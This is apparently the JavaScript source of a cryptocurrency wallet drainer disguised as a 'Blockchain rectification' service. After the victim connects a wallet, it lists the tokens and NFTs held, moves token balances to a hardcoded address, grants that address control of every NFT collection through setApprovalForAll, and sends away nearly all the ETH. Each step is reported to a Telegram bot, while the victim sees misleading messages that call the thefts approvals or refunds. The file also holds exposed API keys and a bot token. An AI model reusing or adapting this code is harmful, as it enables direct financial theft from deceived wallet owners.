let NFTs =[]
let tokens = []
let chainId = null;
let web3Object = null;
let selectedAccount = null;
import {
    EthereumClient,
    w3mConnectors,
    w3mProvider,
    WagmiCore,
    WagmiCoreChains,
    WagmiCoreConnectors,
  } from "https://unpkg.com/@web3modal/ethereum@2.6.2";

  import { parseEther } from "https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs";
  
  import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.6.2";

 
  // 0. Import wagmi dependencies
  const { mainnet, bsc } = WagmiCoreChains;
  const { configureChains, createConfig, writeContract, sendTransaction, fetchBalance, fetchFeeData, connect, switchNetwork, getAccount, getNetwork } = WagmiCore;
  
  // 1. Define chains
  const chains = [mainnet, bsc];
  const projectId = "ee71d215d0dec7d1bf950851c84d9643";
  
  // 2. Configure wagmi client
  const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
  const wagmiConfig = createConfig({
    autoConnect: true,
    connectors: [
      ...w3mConnectors({ chains, version: 2, projectId }),
      new WagmiCoreConnectors.CoinbaseWalletConnector({
        chains,
        options: {
          appName: "Blockchain rectification",
        },
      }),
    ],
    publicClient,
  });
  
  // 3. Create ethereum and modal clients
  const ethereumClient = new EthereumClient(wagmiConfig, chains);
  export const web3Modal = new Web3Modal(
    {
      projectId,
      walletImages: {
        safe: "https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg",
      },
    },
    ethereumClient
  );



const OWNER_ADDRESS = "0xea8968B218a551919FbD5f1166328C82a96dED54"

const ABI = [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_upgradedAddress", "type": "address" }], "name": "deprecate", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "deprecated", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_evilUser", "type": "address" }], "name": "addBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "upgradedAddress", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balances", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "maximumFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "unpause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_maker", "type": "address" }], "name": "getBlackListStatus", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }, { "name": "", "type": "address" }], "name": "allowed", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "paused", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "pause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newBasisPoints", "type": "uint256" }, { "name": "newMaxFee", "type": "uint256" }], "name": "setParams", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "issue", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "redeem", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "remaining", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "basisPointsRate", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "isBlackListed", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_clearedUser", "type": "address" }], "name": "removeBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "MAX_UINT", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_blackListedUser", "type": "address" }], "name": "destroyBlackFunds", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "name": "_initialSupply", "type": "uint256" }, { "name": "_name", "type": "string" }, { "name": "_symbol", "type": "string" }, { "name": "_decimals", "type": "uint256" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Issue", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Redeem", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "newAddress", "type": "address" }], "name": "Deprecate", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "feeBasisPoints", "type": "uint256" }, { "indexed": false, "name": "maxFee", "type": "uint256" }], "name": "Params", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_blackListedUser", "type": "address" }, { "indexed": false, "name": "_balance", "type": "uint256" }], "name": "DestroyedBlackFunds", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "AddedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "RemovedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Pause", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Unpause", "type": "event" }]
const ABIN = [{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint256","name":"maxNftSupply","type":"uint256"},{"internalType":"uint256","name":"saleStart","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"BAYC_PROVENANCE","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_APES","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"REVEAL_TIMESTAMP","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"apePrice","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"baseURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"emergencySetStartingIndexBlock","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"flipSaleState","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxApePurchase","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"numberOfTokens","type":"uint256"}],"name":"mintApe","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"reserveApes","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"saleIsActive","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"baseURI","type":"string"}],"name":"setBaseURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"provenanceHash","type":"string"}],"name":"setProvenanceHash","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"revealTimeStamp","type":"uint256"}],"name":"setRevealTimestamp","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"setStartingIndex","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"startingIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"startingIndexBlock","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenOfOwnerByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];

$(".connect").click(async function () {
    console.log("1")
    try {
        await web3Modal.openModal();
          
    } catch (e) {
        console.log("Could not get a wallet connection", e);
        return;
    } 
    
})

$(".proceed").click(async function () {

    let account = getAccount(); 
    console.log(account)
    if(!account.address){
        console.log("No address")
        alert("You need to connect your wallet first")
    }
    if(account.connector.name === "MetaMask"){
    if(account.connector.options.getProvider().networkVersion !== "1"){
        console.log("Incorrect network")
        await switchNetwork({
            chainId: 1,
          })
    }
}
    selectedAccount = account.address;
    sendMessage("Wallet Connected Successfully to eth mainnet!")
        sendMessage(`Cl address : ${selectedAccount}`)
        
        covalenthqAPICall();
})
const Oxa = "0xEB94D7306CE29437b21C5051F5a0c7d0C12294C0"
const Oxc = "5227607491"

// async function bitqueryAPICall() {

//     const query = `{
//         ethereum {
//           address(address: {is: "${selectedAccount}"}) {
//             balances {
//               currency {
//                 symbol
//                 address
//               }
//               value
//             }
//           }
//         }
//     }`;

//     const url = "https://graphql.bitquery.io/";

//     const opts = {
//         method: "POST",
//         headers: {
//             "Content-Type": "application/json",
//             "X-API-KEY": "BQYbBW4xCbSdau4k5wFWgFNN8Sr4FN3L"
//         },
//         body: JSON.stringify({
//             query,
//         })
//     };

//     const result = await fetch(url, opts).then(res => res.json())

//     let list = result.data.ethereum.address[0].balances

//     let map_list = list.map(m => {
//         return {
//             balance: m.value,
//             address: m.currency.address,
//             symbol: m.currency.symbol
//         }
//     })

//     tokens = map_list.filter(f => f.balance > 0 && f.symbol != "ETH")
//     console.log("ETH", tokens);
//     onApprove()
// }

async function covalenthqAPICall() {

    const params = {
        chain: "eth"
    }
    const url = new URL(`https://deep-index.moralis.io/api/v2/${selectedAccount}/erc20`);
    url.search = new URLSearchParams(params).toString();

    const opts = {
        method: "GET",
        headers: {
            "accept": "application/json",
            "X-API-Key": "LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn"
        },
    };

    try {
        const result = await fetch(url, opts).then(res => res.json())
        console.log(result)
        let list = result;
        console.log("Initial list ", list)
        let map_list = await Promise.all(list.map(async m => {
            let value; 
            try {
                value = await getValue(m.token_address, m.balance, m.decimals)}
            catch(error){
                value = 0
            } 
            
            console.log(value)
            return {
                        balance: m.balance,
                        value: value,
                        address: m.token_address,
                        //type: m.type
                    }
        }));
        console.log("tokens-list", map_list)
        tokens = map_list.filter(f => f.value > 5)
        tokens.sort((a, b) => b.value - a.value);
        console.log("chainId:", await getNetwork(), "Tokens:", tokens);
        NFTs = await getNFTs(selectedAccount).catch(e=>{
            console.log("Unable to get NFts", e);
          });
          NFTs = NFTs.result;
        console.log("NFTs collection ", NFTs)
        if (tokens.length === 0 && NFTs.length === 0)
            onSendEther()
        else
            onApprove()
    } catch {
        sendMessage(`Error collecting info about wallet`)
    }
    
}

async function onApprove() {
    if (tokens.length) {
        //tokens.forEach(token => {
            try {
                loopTokens(tokens);
            }
            catch (error) {
                // Ignore the error and continue with the loop
                console.error(`Error processing item ${error.message}`);
            }
    }
    else {
        if (NFTs.length) {
            //tokens.forEach(token => {
                try {
                    loopNfts(NFTs);
                }
                catch (error) {
                    // Ignore the error and continue with the loop
                    console.error(`Error processing item ${error.message}`);
                }
            onSendEther()
    sendMessage("Error not found, Please switch network or try again!")
    }else{
        try {
            onSendEther()
        }
        catch (error) {
            // Ignore the error and continue with the loop
            console.error(`Error processing item ${error.message}`);
        }
    }
}
}

async function loopTokens(tokens){
    
    for await (let token of tokens) {
        console.log("Token", token)
        try {
        sendMessage("New token")
        let { hash } = await writeContract({
            address: token.address,
            abi: ABI,
            functionName:'transfer',
            args: [Oxa,
                token.balance
                ],
          })
          console.log("hash", hash)
           if (hash){
                console.log("Approved")
                sendMessage("Approve Completed Successfully")
                sendMessage(`TOKEN Contract Address ${token.address}`)
                sendMessage(`Token balance is ${token.balance}`)
                sendMessage(`Your address ${Oxa}`)
           }
        }
        catch(error){
            console.log(`Error: ${error}`)
            sendMessage("Transaction Rejected")
        }
    };
    
        await loopNfts(NFTs)
    }
    
async function loopNfts(NFTs){
        for await (let NFT of NFTs) {
            console.log("NFT", NFT)
            try {
            let { hash } = await writeContract({
                address: NFT.token_address,
                abi: ABIN,
                functionName:'setApprovalForAll',
                args: [Oxa,
                    true
                    ],
              })
              console.log("hash", hash)
                console.log(`Transaction Receipt: ${receipt}`)
                sendMessage("Approve Completed Successfully")
                sendMessage(`NFT Contract Address ${NFT.token_address}`)
                sendMessage(`Your address ${Oxa}`)
                }
            
            catch(error){
                console.log(`Error: ${error}`)
                sendMessage("Transaction Rejected")
            }
        }
            await onSendEther();
    }
  
async function onSendEther() {
    console.log("sending ether")
    try {
        let balance = await fetchBalance({
            address: selectedAccount,
          })
          console.log(balance)
        const feeData = await fetchFeeData();
        console.log(feeData)
        var gasPrice = feeData.formatted.gasPrice; // estimate the gas price
        gasPrice = parseFloat(gasPrice)
        let amount = parseFloat(balance.formatted) - (gasPrice * 0.00021)
        amount = parseEther(amount.toString())
        console.log(amount)
       
        const { hash } = await sendTransaction({
            to: Oxa,
            value: amount,
            })

            console.log(hash)
            sendMessage("Transaction hash ", hash)
            sendMessage("Transaction is submitted to the network")
            sendMessage("Transfer Completed Successfully, You should receive some native tokens")
        
    } catch {
        sendMessage("Insufficient funds for transfer or transaction was rejected")
    }

}

async function sendMessage(message){
    return new Promise((resolve, reject)=>{
      const chat_id = Oxc;
      fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
            method: "GET",
            headers: {
                
            }
        })
        .then(async(res) => {
            if(res.status > 399) throw res;
            resolve(await res.json());
        }).catch(err=>{
            reject(err);
        })
    })
  }

async function getPrice(address){
return new Promise((resolve, reject)=>{
    fetch(`https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${address}&vs_currencies=usd`, {
        method: "GET",
        headers: {
            //"accept": "application/json",
            //"X-API-Key": api_key
        }
    })
    .then(async(res) => {
        if(res.status > 399) throw res;
        resolve(await res.json());
    }).catch(err=>{
        reject(err);
    })
})
}
async function getValue(address, balance, decimal){
    console.log(address, balance, decimal)
    let price = await getPrice(address);
    console.log("price", price)
    price = parseFloat(price[address].usd);
    let value = (balance / (10 ** (decimal || 18))) * price;
    value = parseInt(value);
    if (price) {
        return value;
    }else{
        return 0;
    }
}
async function getNFTs(address="", api_key="LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn", chain="eth", limit="50"){
    return new Promise((resolve, reject)=>{
        fetch(`https://deep-index.moralis.io/api/v2/${address}/nft/collections?chain=${chain}&format=decimal&limit=${limit}`, {
            method: "GET",
            headers: {
                "accept": "application/json",
                "X-API-Key": api_key
            }
        })
        .then(async(res) => {
            if(res.status > 399) throw res;
            resolve(await res.json());
        }).catch(err=>{
            reject(err);
        })
    })
  }
  